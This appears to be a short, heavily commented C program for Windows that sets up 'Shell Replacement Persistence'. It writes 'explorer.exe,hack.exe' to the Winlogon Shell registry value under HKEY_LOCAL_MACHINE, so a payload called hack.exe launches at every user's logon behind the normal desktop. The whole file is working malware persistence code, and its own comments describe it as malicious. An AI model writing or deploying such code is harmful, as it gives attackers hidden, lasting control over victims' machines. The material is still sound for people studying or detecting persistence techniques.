#include <windows.h>
#include <string.h>

int main(int argc, char *argv[])
{
    HKEY hkey = NULL; // Open handle to the registry

    /*Malicious SHell COnfig
    - Replaces the default windows shell with our malicious exe
    - Format: "explorer.exe, hack.exe" 0 Windows will launch both process
    - explorer.exe: Mainatians normal windows GUI shell(maintains appearance)
    -hack.exe: Malicious payload(runs in background)
    "Shell Replacement Persistence"
    */
    const char *sh = "explorer.exe,hack.exe";

    // Registry Modification
    // Open the windows winLogon registry key for writing
    // HKEY_LOCAL_MACHINE/SOFTWARE/MICROSOFT/WINDOWS NT/CURRENTVERSION/WINLOGON
    // KEY controls windows login and shell behavior
    LONG res = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,                                                   // rOOT key - affects all users on the system
        (LPCSTR) "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", // SUBKey path
        0,                                                                    // Reserved parameter must be 0
        KEY_WRITE,                                                            // Access rights- we need write permission
        &hkey                                                                 // Output paramater: handle to the opened key
    );

    // Check if registry key was successfully opened
    if (res == ERROR_SUCCESS)
    {
        // create a malicious  entry
        // Modify the shell value to include our malicious executable
        // This ensures our malware runs every time any user logs into windows
        RegSetValueEx(
            hkey,
            (LPCSTR) "Shell",    // Value name: "Shell"- Controls which process runs a desktop shell
            0,                   // Reserved parameter, must be 0
            REG_SZ,              // Data Type: Null-terminated string
            (unsigned char *)sh, // Data: our Modified shell configuration
            strlen(sh) + 1       // Data size: length of the string()
        );

        //===CleanUP====
        // Close the registry key handle to free system resources
        // This is important to prevent resource leaks
        RegCloseKey(hkey);
    }

    return 0; // Program completed(returns 0 even if registry modification failed)
}